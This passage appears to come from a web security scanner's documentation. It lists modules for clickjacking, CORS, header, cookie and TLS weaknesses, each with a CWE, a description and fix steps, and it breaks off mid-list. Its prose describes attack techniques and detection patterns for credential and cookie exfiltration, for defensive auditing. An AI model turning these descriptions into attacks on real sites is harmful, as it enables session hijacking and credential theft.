**Module:** `clickjacking_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

Sensitive pages frameable without X-Frame-Options or CSP frame-ancestors Deprecated ALLOW-FROM directive ignored by modern browsers — no framing protection JavaScript frame-busting code bypassed via sandbox attribute on framing iframe

**How to fix:**
- Set Content-Security-Policy: frame-ancestors 'self' on all sensitive pages
- Replace X-Frame-Options: ALLOW-FROM with CSP frame-ancestors (ALLOW-FROM is deprecated)
- Do not rely on JS frame-busting as sole protection — use HTTP headers

---

### 82. Insufficient Content Framing Protection
**Module:** `content_security_framing` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-1021**

No X-Frame-Options or CSP frame-ancestors: page frameable in any site — clickjacking enabled frame-ancestors: *: explicitly allows any origin to embed this page in an iframe XFO ALLOW-FROM without CSP: deprecated XFO directive ignored by modern browsers XFO/CSP inconsistency: server sends both with conflicting values — browser uses CSP, XFO ignored <object>/<embed> tags: plugin content bypasses framing protections and CSP sandbox

**How to fix:**
- Set Content-Security-Policy: frame-ancestors 'none' or frame-ancestors 'self'
- Optionally keep X-Frame-Options: DENY as defense-in-depth for older browsers
- Remove XFO: ALLOW-FROM entirely — replace with CSP frame-ancestors with explicit origin list
- Remove or restrict <object> and <embed> tags; use HTML5 equivalents instead
- Apply framing protection consistently across all pages, not just the home page

**References:** [↗](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

---

### 83. Form Action Hijacking
**Module:** `form_action_hijacking` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Forms submitting to external domains exfiltrate user data (credentials, PII) to attacker-controlled servers javascript: URI form actions execute arbitrary JS on form submit, bypassing same-origin protections data: URI form actions provide unusual behavior potentially used to bypass security controls HTTP form action on HTTPS page sends credentials in plaintext (mixed content POST) Password and payment fields in forms with external actions directly exfiltrate sensitive user data

**How to fix:**
- Ensure form action attributes only point to same-origin HTTPS endpoints
- Implement Content Security Policy with form-action directive to restrict valid form targets
- Audit all third-party payment and form processors — verify they use HTTPS and are intentional
- Block javascript: and data: URIs in form actions via CSP or server-side output encoding

---

### 84. Clickjacking Vulnerability
**Module:** `clickjacking` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1021**

Attackers embed your site in an invisible iframe and trick users into clicking hidden UI elements One-click attacks on authenticated actions: password change, wire transfers, account deletion

**How to fix:**
- Set X-Frame-Options: DENY on all pages (or SAMEORIGIN if self-framing is required)
- Add CSP frame-ancestors 'none' — more flexible than X-Frame-Options

---

### 85. Reverse Tabnabbing via window.opener
**Module:** `tabnabbing` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1022**

target=_blank without rel=noopener: child tab can redirect parent (opener) to phishing page window.open() without noopener: newly opened tab retains reference to opener window Phishing amplification: attacker controls opened tab, redirects user's original session to fake login window.opener.location overwrite: attacker redirects authenticated user to credential harvesting page

**How to fix:**
- Add rel="noopener noreferrer" to all target=_blank links
- Use window.open(url, '_blank', 'noopener,noreferrer') for programmatic window opening
- Set window.opener = null in opened windows if you control them
- Enable CSP header to restrict what child tabs can do
- Consider removing target=_blank unless strictly needed — same-tab navigation is safer

**References:** [↗](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

---

### 86. Tabnapping / window.opener Exploitation
**Module:** `tabnapping_passive` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1022** &nbsp;|&nbsp; **MITRE:** T1192

Detects tabnapping vulnerabilities: <a target=_blank> without rel='noopener noreferrer' (opened tab retains window.opener reference; malicious site can redirect the opener/parent tab to a phishing page while user is looking at the new tab), window.opener.location redirect (child explicitly redirects opener to attacker URL), window.opener.postMessage() without origin validation (attacker sends crafted cross-origin messages to opener bypassing same-origin), window.open() without nulling opener reference, and missing Referrer-Policy header (Referer leaks full URL including auth tokens to opened external resources).

**How to fix:**
- Add rel='noopener noreferrer' to all <a target=_blank> links
- Set window.opener = null immediately after window.open() calls
- Validate origin in all window.postMessage() handlers
- Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer
- Use <meta name=referrer content=no-referrer> for legacy browser coverage

**References:** [↗](https://owasp.org/www-community/attacks/Reverse_Tabnapping) · [↗](https://cwe.mitre.org/data/definitions/1022.html)

---

## HTTP Headers & Transport

*28 scanners in this category.*

### 87. Permission Policy Security
**Module:** `permission_policy_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-732**

Permissions Policy misconfiguration — wildcard (*) grants to camera/microphone/geolocation/payment, iframes granted sensitive permissions via over-permissive allow= attribute, serial/USB/Bluetooth features granted wildcard access.

**How to fix:**
- Use specific origins in Permissions-Policy instead of wildcards (*)
- Restrict iframe allow= to only permissions required by the embedded content
- Explicitly block high-risk features (serial, usb, bluetooth) via Permissions-Policy
- Audit all Permissions-Policy headers on responses to minimize permission grants

**References:** [↗](https://w3c.github.io/webappsec-permissions-policy/) · [↗](https://cwe.mitre.org/data/definitions/732.html)

---

### 88. CORS Misconfiguration
**Module:** `cors` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-942**

Reflected origin + Allow-Credentials: true enables cross-site credential theft Attacker site makes authenticated API calls on behalf of logged-in victims Wildcard ACAO (*) disables same-origin protection for all cross-origin requests Null-origin acceptance allows sandboxed iframes / local HTML to access APIs

**How to fix:**
- Maintain a server-side allowlist of trusted origins — never reflect the request Origin dynamically
- Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true
- Use SameSite=Strict on session cookies as complementary defense

---

### 89. Advanced CORS Bypass
**Module:** `cors_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-942**

Regex-based origin validation bypassed via suffix injection (evil.com.attacker.com) Subdomain wildcard reflection: any attacker-controlled subdomain bypasses the check

**How to fix:**
- Use exact string matching for origins — avoid regex patterns with wildcards
- Audit subdomain ownership — any compromised subdomain becomes a CORS bypass vector

---

### 90. CORS Preflight Misconfiguration
**Module:** `cors_preflight_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-942**

Reflected origin with credentials allows attacker site to make authenticated DELETE/PUT requests Missing Vary: Origin causes CDN to cache CORS response for one origin and serve it to others Access-Control-Allow-Credentials: true combined with permissive origin enables full auth bypass

**How to fix:**
- Maintain a server-side origin allowlist — never reflect the request Origin header directly
- Add Vary: Origin to all CORS responses so CDN caches are keyed by origin
- Never set Allow-Credentials: true with Allow-Origin: * or reflected origins

---

### 91. CORS Credential Forwarding Attack
**Module:** `cors_credential_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346** &nbsp;|&nbsp; **MITRE:** T1563

Detects credentials:'include' with wildcard origin, fetch to external domains with credentials (session forwarding), attacker-controlled URL with credentials, and XHR withCredentials=true to analytics/CDN endpoints.

**How to fix:**
- Never use credentials:'include' with dynamic or user-controlled URLs
- Restrict cross-origin credential requests to explicitly trusted, hardcoded origins only
- Avoid withCredentials=true for requests to analytics or CDN endpoints
- Use SameSite=Strict cookies instead of credentials:'include' where possible

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 92. CORS Sensitive Header Exposure
**Module:** `cors_expose_headers` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Access-Control-Expose-Headers with Authorization or X-API-Key allows cross-origin JavaScript to read credentials Wildcard (*) in Expose-Headers exposes ALL response headers to cross-origin requests ACEH combined with Allow-Credentials: true allows attacker sites to steal tokens on behalf of logged-in users Missing Vary: Origin on CORS responses allows CDN to cache and serve wrong CORS headers to other origins

**How to fix:**
- Never include Authorization, X-API-Key, Set-Cookie, or X-CSRF-Token in Access-Control-Expose-Headers
- Avoid wildcard (*) in Expose-Headers; enumerate only non-sensitive headers (Content-Length, X-Request-ID)
- Add Vary: Origin to all responses that include CORS headers
- Audit all cross-origin JavaScript consumers — they should not require access to sensitive response headers

---

### 93. CORS Null Origin Bypass
**Module:** `cors_null_origin` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

Origin: null is sent by sandboxed iframes, file:// pages, and data: URIs — commonly attacker-controlled contexts ACAO: null with ACAC: true grants credentialed cross-origin reads to any sandboxed iframe the attacker controls Attacker embeds a sandboxed iframe on their domain; its requests have Origin: null and receive authenticated responses Bypasses CORS protections that otherwise restrict which origins can read credentialed responses

**How to fix:**
- Never reflect 'null' in Access-Control-Allow-Origin; allowlist specific origins instead
- Remove Access-Control-Allow-Credentials: true when using wildcard or null origins
- Validate Origin header against an explicit allowlist of trusted origins
- Audit CORS configuration: reject requests with Origin: null by returning no CORS headers

---

### 94. CORS Dynamic Origin Reflection
**Module:** `cors_origin_reflection` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-942**

Origin header reflected with ACAC: true: any origin makes credentialed requests — CSRF impossible to defend against Dynamic ACAO mirrors attacker origin: cross-origin reads of authenticated API responses Reflected null origin with credentials: null origin in sandboxed iframe can read authenticated responses Wildcard ACAO with credentials: forbidden by spec but some servers mis-implement; attacker reads auth responses Subdomain wildcard reflection: compromise of any subdomain enables cross-origin credential reads

**How to fix:**
- Maintain an explicit allowlist of trusted origins — never reflect the request Origin header
- Never combine Access-Control-Allow-Credentials: true with dynamic ACAO
- Use CORS middleware that compares Origin against a fixed allowlist, not string reflection
- Reject 'null' origin for credentialed requests — sandboxed iframes should not access credentials
- Audit all API endpoints for CORS headers; consider API gateway with centralized CORS policy

**References:** [↗](https://portswigger.net/web-security/cors)

---

### 95. Dangerous CORS Policy Configuration
**Module:** `cors_policy_advanced` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346** &nbsp;|&nbsp; **MITRE:** T1539

Detects high-risk CORS header combinations: wildcard origin with credentials (spec violation exploitable by misconfigured clients), ACAO: null (sandbox iframes bypass origin checks), reflected specific origin with credentials enabled (classic CORS misconfiguration allowing full credential theft), Allow-Methods including destructive verbs (PUT/DELETE), and Allow-Headers exposing authentication tokens.

**How to fix:**
- Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true
- Do not allow Origin: null — reject requests from sandboxed contexts
- Use an explicit allowlist for trusted origins rather than reflecting the request's Origin header
- Restrict Access-Control-Allow-Methods to the minimum required (avoid PUT, DELETE unless needed cross-origin)
- Do not include Authorization or API key headers in Access-Control-Allow-Headers

**References:** [↗](https://portswigger.net/web-security/cors) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

### 96. Host Header Injection
**Module:** `host_header_injection` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-20**

Injected Host header reflected in password-reset emails poisons reset link domain X-Forwarded-Host / X-Host override processed by app — allows cache poisoning Password reset URL hijacking redirects victim's reset token to attacker's domain

**How to fix:**
- Configure a canonical hostname in application config — never use request Host header for URL generation
- Validate Host header against a strict allowlist of permitted values; reject unknown hosts
- Configure reverse proxy to strip X-Forwarded-Host, X-Host, X-Forwarded-Server before proxying

---

### 97. HTTP Method Override / Tunneling
**Module:** `http_method_override` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-749**

X-HTTP-Method-Override header tunnels DELETE/PUT through POST — bypasses firewall rules Form method tunneling with _method parameter bypasses WAF method restrictions Reflected override headers in responses confirm server-side method processing

**How to fix:**
- Disable X-HTTP-Method-Override, X-Method-Override, and X-HTTP-Method header processing
- Implement method validation independently of override headers
- Configure WAF rules to detect and block method override patterns

---

### 98. HTTP Method Override / Verb Tunneling
**Module:** `http_method_tampering` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-650**

X-HTTP-Method-Override: DELETE accepted on GET: CSRF attack deletes resources via image/link tag _method=DELETE param accepted: form-based CSRF bypasses SameSite cookie protection on DELETE Method tunneling enables CSRF: GET requests that trigger destructive state changes Authorization bypass: DELETE restricted to admins but method override header bypasses check Audit log confusion: logs show GET but actual operation was DELETE/PUT

**How to fix:**
- Disable X-HTTP-Method-Override and _method support entirely if not needed
- If needed, apply same authorization checks to overridden methods as the real HTTP method
- Require CSRF token for all state-changing operations regardless of HTTP method
- Log the override header in audit logs to maintain accurate records
- Test all API endpoints for method override acceptance as part of security review

**References:** [↗](https://owasp.org/www-community/attacks/Cross_Site_Tracing)

---

### 99. Content-Type Confusion / MIME Sniffing
**Module:** `content_type_confusion` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-434**

Missing X-Content-Type-Options allows browsers to sniff MIME type and execute malicious content JSON API responses served as text/html enable stored XSS via browser rendering SVG served without nosniff or CSP restriction allows embedded JavaScript execution

**How to fix:**
- Set X-Content-Type-Options: nosniff on all responses
- Serve JSON APIs with Content-Type: application/json — never text/html
- Restrict SVG serving: require authentication or serve with CSP sandbox header

---

### 100. Content-Disposition Security Issues
**Module:** `content_disposition_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-434**

SVG or HTML files served inline from upload paths execute JavaScript in the site's origin, enabling stored XSS via file upload JavaScript files served from media/upload paths can be executed in the same origin with full same-origin privileges Path traversal sequences (../) in Content-Disposition filename may confuse downstream parsers (wget, curl, API clients) RTL override (U+202E) in filename makes executables appear to have safe extensions to unsuspecting users Executable file extensions (.exe, .bat, .ps1) served as attachments bypass OS-level download warnings on trusted domains

**How to fix:**
- Set Content-Disposition: attachment on all file-serving paths (especially /uploads, /media, /files)
- Sanitize Content-Disposition filename: strip path separators, control characters, and Unicode overrides
- Never serve user-uploaded SVG, HTML, or JavaScript files inline in the upload origin
- Block or rename dangerous extensions (.exe, .bat, .ps1) at the upload endpoint before serving

---

### 101. Missing Security Headers
**Module:** `headers` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

Missing Strict-Transport-Security allows SSL stripping on unencrypted networks Missing X-Frame-Options enables clickjacking attacks on login / action pages Missing X-Content-Type-Options allows MIME-sniffing-based content injection

**How to fix:**
- Set Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
- Set X-Frame-Options: DENY or use CSP frame-ancestors 'none'
- Set X-Content-Type-Options: nosniff on all responses
- Audit at securityheaders.com after each deployment

---

### 102. HTTP Security Header Configuration Issues
**Module:** `http_security_headers_deep` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

HSTS max-age < 6 months: short expiry window leaves users unprotected after cache invalidation HSTS without includeSubDomains: HTTP subdomains can hijack cookies set without Domain= attribute Missing X-Content-Type-Options: nosniff: MIME-sniffing enables content injection via file uploads Referrer-Policy: unsafe-url: full URL including auth tokens sent to all cross-origin destinations Missing Permissions-Policy: browser APIs (camera/mic/geolocation) available to embedded third-party scripts

**How to fix:**
- Set HSTS: max-age=31536000; includeSubDomains; preload — submit to HSTS preload list
- Set X-Content-Type-Options: nosniff on all responses
- Set Referrer-Policy: strict-origin-when-cross-origin or no-referrer
- Set Permissions-Policy: camera=(), microphone=(), geolocation=() to deny all by default
- Use securityheaders.com to grade and track header configuration over time

**References:** [↗](https://securityheaders.com) · [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

---

### 103. Inconsistent Security Headers Across Paths
**Module:** `http_security_consistency` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

CSP on main page but absent on /api/*: XSS on API responses executes without policy restriction X-Frame-Options absent on /login or error pages: clickjacking captures credentials HSTS absent on API paths: downgrade attack possible for API calls X-Content-Type-Options absent on static assets: content sniffing bypasses type-based security Security headers only on main page create false sense of security — every response needs them

**How to fix:**
- Apply security headers at the web server level (not application level) so all responses are covered
- Use nginx add_header or Apache Header directives at the server/vhost block level
- Add automated tests that verify security headers on multiple response types (/api, /login, /static, 404)
- Consider a security header middleware that applies consistently to all routes
- Use Mozilla Observatory or security header scanners against multiple paths, not just the homepage

---

### 104. Mixed Content (HTTP on HTTPS Page)
**Module:** `mixed_content` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-311**

HTTP resources on HTTPS pages interceptable and modifiable by network attackers JavaScript loaded over HTTP replaced with malicious code silently

**How to fix:**
- Ensure all sub-resources (scripts, styles, images, fonts) use HTTPS
- Set Content-Security-Policy: upgrade-insecure-requests as a blanket fix

---

### 105. Missing Content-Security-Policy
**Module:** `csp` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

Without CSP, any XSS can execute arbitrary JavaScript in the victim's browser No monitoring of injection attempts without report-uri

**How to fix:**
- Start with Content-Security-Policy-Report-Only to capture violations without breaking the site
- Progress to enforcing mode: default-src 'self'; replace unsafe-inline with nonces

---

### 106. Weak Content-Security-Policy
**Module:** `csp_advanced` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-693**

unsafe-inline and unsafe-eval completely negate XSS protection CDN wildcards (*.googleapis.com) become XSS bypass vectors if any CDN file is compromised

**How to fix:**
- Replace unsafe-inline with nonce-based CSP (nonce changes per request)
- Remove unsafe-eval — refactor code that uses eval()/setTimeout(string)
- Use specific CDN URLs rather than wildcards in script-src

---

### 107. Permissions-Policy Exposes Sensitive Features
**Module:** `permissions_policy_deep` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-276**

camera/microphone allowed for all origins: embedded third-party iframes can activate hardware sensors payment=*: embedded iframes can initiate Payment Request dialogs without user awareness display-capture=*: any embedded iframe can initiate screen recording interest-cohort/browsing-topics not opted out: user browsing cohort data exposed to embedded parties idle-detection=*: third-party iframes infer user presence and inactivity state Accelerometer/gyroscope/magnetometer not restricted: fingerprinting and timing side-channel from iframes

**How to fix:**
- Deny all sensitive features by default: Permissions-Policy: camera=(), microphone=(), geolocation=()
- Explicitly opt out of privacy APIs: interest-cohort=(), browsing-topics=()
- Grant sensitive features only to same-origin: camera=(self), not camera=*
- Migrate Permissions-Policy-Report-Only to the enforcing Permissions-Policy header
- Regularly audit which iframes need which features and grant only what is necessary

---

### 108. Permissive Permissions-Policy
**Module:** `feature_policy_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-16**

Missing or overly permissive Permissions-Policy allows iframes to access camera/microphone Wildcard (*) in Permissions-Policy grants all origins access to sensitive browser features Unrestricted geolocation, payment, USB, and Bluetooth API access in embedded content

**How to fix:**
- Set Permissions-Policy to deny all features not explicitly required: camera=(), microphone=()
- Never use =* wildcards for high-risk features (camera, microphone, payment, geolocation)
- Audit third-party iframes — restrict their feature access via Permissions-Policy header

---

### 109. Missing Fetch Metadata Isolation
**Module:** `fetch_metadata` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-346**

Without Sec-Fetch-Site checking, cross-site requests can trigger state-changing actions CSRF becomes trivial when server cannot distinguish same-site vs. cross-site requests

**How to fix:**
- Implement a Resource Isolation Policy that rejects unexpected Sec-Fetch-Site values
- Pair with SameSite=Strict cookies and CSRF tokens as layered defense

---

### 110. Reporting API External Endpoint Leak
**Module:** `reporting_api_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-200**

Report-To with external endpoint: CSP violations sent to third party reveal blocked resource URLs, inline script violations, and user browsing patterns NEL include_subdomains: network error reports collected from all subdomains including internal/staging services High NEL success_fraction: frequent navigation data sent to reporting endpoint — privacy leak of user activity Long max_age on Report-To: stale reporting endpoints persist in browser cache after endpoint rotation, sending reports to defunct/attacker-controlled server CSP report-uri external: violation reports contain the URL of the page that triggered the violation — user path disclosure to third party

**How to fix:**
- Host your own reporting endpoint (e.g., /csp-report) instead of using third-party reporting services
- If using a third-party reporting service, verify their privacy policy and data handling for CSP violation payloads
- Set NEL include_subdomains: false unless you explicitly need subdomain error monitoring
- Keep success_fraction low (0-0.01) to minimize navigation data sent to reporting endpoints
- Rotate Report-To endpoints promptly and set max_age ≤ 86400 to minimize stale endpoint lifetime

**References:** [↗](https://w3c.github.io/reporting/) · [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Report-To)

---

### 111. MIME Type Sniffing / Content-Type Confusion
**Module:** `content_type_sniffing` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-430**

Missing X-Content-Type-Options: nosniff: IE/legacy browsers sniff MIME, execute text/plain as HTML Upload endpoint without nosniff: uploaded SVG/HTML file served with wrong MIME executed as script JSON with HTML tags without nosniff: response rendered as HTML, enabling stored XSS via JSON API text/plain containing JavaScript: MIME sniffing causes browser to execute as script Polyglot file served as image: browser executes embedded HTML/JS when rendered via sniffing

**How to fix:**
- Set X-Content-Type-Options: nosniff on every HTTP response — add as a global middleware header
- Validate MIME type of uploaded files server-side using magic bytes, not file extension or client header
- Store user-uploaded files on a separate domain (e.g., static.example.com) to isolate execution context
- Set explicit, correct Content-Type on all responses — never rely on browser sniffing
- Use CSP default-src to restrict what content types can execute, even if sniffing occurs

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options) · [↗](https://owasp.org/www-community/attacks/MIME_sniffing)

---

### 112. Content Sniffing / MIME Type Confusion
**Module:** `content_sniffing_bypass` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-430** &nbsp;|&nbsp; **MITRE:** T1027

Detects responses susceptible to MIME sniffing attacks: HTML/JS served without X-Content-Type-Options: nosniff (legacy browsers execute as scripts), HTML content under application/octet-stream (polyglot file execution), reflected uploaded filenames with executable extensions, and SVG files without nosniff (inline JavaScript bypasses CSP script-src).

**How to fix:**
- Add X-Content-Type-Options: nosniff to all responses, especially file downloads and uploads
- Never serve HTML or JavaScript content with application/octet-stream or text/plain
- Validate and sanitize uploaded file extensions server-side; never trust client-supplied MIME types
- Serve SVG files with X-Content-Type-Options: nosniff and a strict CSP

**References:** [↗](https://owasp.org/www-project-secure-headers/) · [↗](https://cwe.mitre.org/data/definitions/430.html)

---

### 113. NEL / Reporting API Misconfiguration
**Module:** `nel_reporting` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-200**

Report-To or Reporting-Endpoints with RFC-1918 or internal hostname collector URLs expose internal infrastructure to page visitors NEL or Reporting collectors using HTTP (not HTTPS) send browser reports in plaintext where they can be intercepted NEL max_age=0 silently disables network error monitoring, masking production failures Malformed NEL header JSON silently disables network error logging without warning

**How to fix:**
- Use HTTPS collector endpoints that are on public infrastructure, not internal subnets
- Avoid internal hostnames (.internal, .corp, .intranet) in Report-To and Reporting-Endpoints
- Set NEL max_age to a positive value (e.g., 86400) for active network error monitoring
- Validate NEL header JSON syntax before deploying; use browser DevTools to verify NEL is active

---

### 114. HTTP Range Request Misconfiguration
**Module:** `http_range_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-200**

Accept-Ranges on JSON API endpoints enables byte-range timing oracle attacks against secret tokens in response body Accept-Ranges on auth endpoints allows partial content extraction from authentication responses Content-Range header reveals total resource size, enabling file identity confirmation for encrypted files Multipart byteranges response from API endpoints indicates server treats application data as splittable file content

**How to fix:**
- Set Accept-Ranges: none on all API, auth, and application endpoints
- Disable range request processing at the application layer for non-static-file endpoints
- Suppress Content-Range headers for sensitive resources
- Configure reverse proxy (nginx/Apache) to strip range request handling for /api/ paths

---

## Cookies

*6 scanners in this category.*

### 115. SameSite Cookie CSRF Misconfiguration
**Module:** `same_site_cookie_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-352** &nbsp;|&nbsp; **MITRE:** T1550.004

Detects SameSite=None without Secure flag, SameSite=Lax on session/auth cookies (CSRF risk for GET-based mutations), cookie value injection from URL parameters, and session cookies missing explicit SameSite attribute.

**How to fix:**
- Always pair SameSite=None with the Secure flag
- Use SameSite=Strict for session and authentication cookies
- Never set cookie values from URL parameters
- Set SameSite attribute explicitly on all cookies — don't rely on browser defaults

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitevalue) · [↗](https://cwe.mitre.org/data/definitions/352.html)

---

### 116. Cookie Store API Cookie Injection / Jar Exfiltration
**Module:** `cookie_store_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-384**

Cookie value from URL param: cookieStore.set() value sourced from URL parameter — attacker injects arbitrary cookie values via URL crafting Full cookie jar exfiltrated: cookieStore.getAll() result transmitted to remote — entire accessible cookie jar sent to attacker server Change event exfiltration: cookieStore change listener automatically transmits newly set cookies — real-time cookie interception relay Set without Secure flag: cookieStore.set() without secure:true — cookie transmitted over HTTP connections in cleartext Sensitive cookie logged: auth/session cookie read via cookieStore and logged to console — credential disclosure to any XSS attacker with console access

**How to fix:**
- Never derive cookieStore.set() values from URL parameters — treat all URL input as untrusted
- Do not transmit cookieStore.getAll() results to any external endpoint
- Remove cookieStore change event listeners that forward cookie changes to remote endpoints
- Always set secure:true and sameSite:'strict' when using cookieStore.set()
- Use HttpOnly cookies via server-side Set-Cookie header for sensitive session cookies — they are inaccessible to JavaScript including Cookie Store API

**References:** [↗](https://wicg.github.io/cookie-store/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/CookieStore)

---

### 117. Insecure Cookie Configuration
**Module:** `cookies` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-614**

Missing Secure flag transmits session cookies over HTTP — interceptable on the network Missing HttpOnly flag exposes session tokens to JavaScript (XSS persistence) Missing SameSite flag enables CSRF attacks against session-authenticated endpoints

**How to fix:**
- Set Secure, HttpOnly, and SameSite=Lax (or Strict) on all session cookies
- Use short cookie expiry for session cookies — no persistent sessions

---

### 118. Advanced Cookie Security Issues
**Module:** `cookie_advanced` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-614**

Overly broad cookie Domain attribute leaks cookies to all subdomains Cookie prefix violations (__Host- / __Secure-) allow subdomain cookie injection

**How to fix:**
- Use __Host- prefix for most sensitive cookies: restricts to exact host, HTTPS-only, path=/
- Omit Domain attribute where possible — defaults to current host only

---

### 119. CHIPS / Partitioned Cookie Issues
**Module:** `cookies_partitioned_security` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-1275**

SameSite=None cookies without Partitioned will be blocked in Chrome 3PCD, silently breaking embedded widget functionality Partitioned cookies without Secure are invalid per CHIPS spec — browsers may ignore the Partitioned attribute Partitioned cookies without SameSite=None won't be sent in third-party cross-site contexts __Host- prefix with Partitioned is incompatible — __Host- requires SameSite=Strict which conflicts with cross-site CHIPS

**How to fix:**
- Add the Partitioned attribute to all SameSite=None cookies used in embedded/third-party contexts
- Always combine Partitioned with Secure: Set-Cookie: name=val; SameSite=None; Secure; Partitioned
- Audit all SameSite=None cookies and determine which are used in third-party contexts requiring CHIPS
- Remove __Host- prefix from cookies that need to be Partitioned for cross-site use

---

### 120. Insecure Autocomplete on Sensitive Form Fields
**Module:** `autocomplete_security` &nbsp;|&nbsp; **Severity:** 🟢 LOW
**CWE-522**

Password without autocomplete=off: browser stores cleartext password in autocomplete database CC number without autocomplete=off: card details saved in browser — stolen by local attacker or malware Shared device risk: browser auto-fills credentials into form for next user of shared computer API key field with autocomplete: developer's API key suggested to other users on shared browser Phishing amplification: browser autofill triggered on phishing page cloned with same field names

**How to fix:**
- Set autocomplete='new-password' on password change/creation fields
- Set autocomplete='current-password' on login password fields (enables password manager integration)
- Set autocomplete='off' on credit card CVV and one-time code fields
- Set autocomplete='off' on API key, secret, and token input fields
- Note: browsers may ignore autocomplete='off' — consider using JavaScript to clear fields after use

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete)

---

## TLS & Cryptography

*5 scanners in this category.*

### 121. TLS / SSL Misconfiguration
**Module:** `tls_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-326**

TLS 1.0/1.1 have known vulnerabilities (POODLE, BEAST) — deprecated by RFC 8996 Weak cipher suites (RC4, DES, NULL) allow decryption of captured traffic Missing certificate validation enables man-in-the-middle attacks

**How to fix:**
- Enforce TLS 1.2 minimum; TLS 1.3 preferred
- Disable all weak cipher suites — use Mozilla SSL Configuration Generator
- Enable HSTS with a long max-age and preload

---

### 122. TLS Certificate Weakness
**Module:** `tls_certificate_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-326**

Expired TLS certificate eliminates all trust guarantees — browsers show hard block Weak cipher suites (RC4, DES, 3DES, EXPORT) allow decryption of captured traffic Self-signed certificate susceptible to MitM — no CA validation chain Certificate expiring in <30 days creates operational risk if renewal is missed

**How to fix:**
- Automate certificate renewal with Certbot / Let's Encrypt or ACM
- Enforce TLS 1.2+ and disable RC4, DES, 3DES, EXPORT, NULL cipher suites
- Use a CA-signed certificate and ensure full chain (intermediate certs) is served
- Monitor certificate expiry with alerting at 30-day and 7-day thresholds

---

### 123. WebCrypto API Misuse / Weak Cryptography
**Module:** `web_crypto_weaknesses` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-330**

Math.random() for tokens/secrets: predictable values — attacker brute-forces session tokens AES-ECB mode: encrypting same plaintext blocks produces same ciphertext — pattern leakage Static/hardcoded IV for AES-GCM: IV reuse breaks GCM authentication — enables decryption and forgery SHA-1/MD5 hashing: collision-vulnerable — certificate forgery, hash extension, preimage attacks Timestamp as entropy source: Date.now() seed is predictable within milliseconds

**How to fix:**
- Use crypto.getRandomValues() for all cryptographic randomness requirements
- Use AES-GCM (preferred) or AES-CBC with PKCS7 padding — never AES-ECB
- Generate a unique random 12-byte IV for every encryption operation with AES-GCM
- Use SHA-256 or SHA-3 for all hashing; SHA-512 for password-derived key functions
- Use PBKDF2 or Argon2 for key derivation from passwords

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto)

---

### 124. Weak Cryptographic Primitive Usage
**Module:** `cryptographic_weakness_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-327** &nbsp;|&nbsp; **MITRE:** T1600

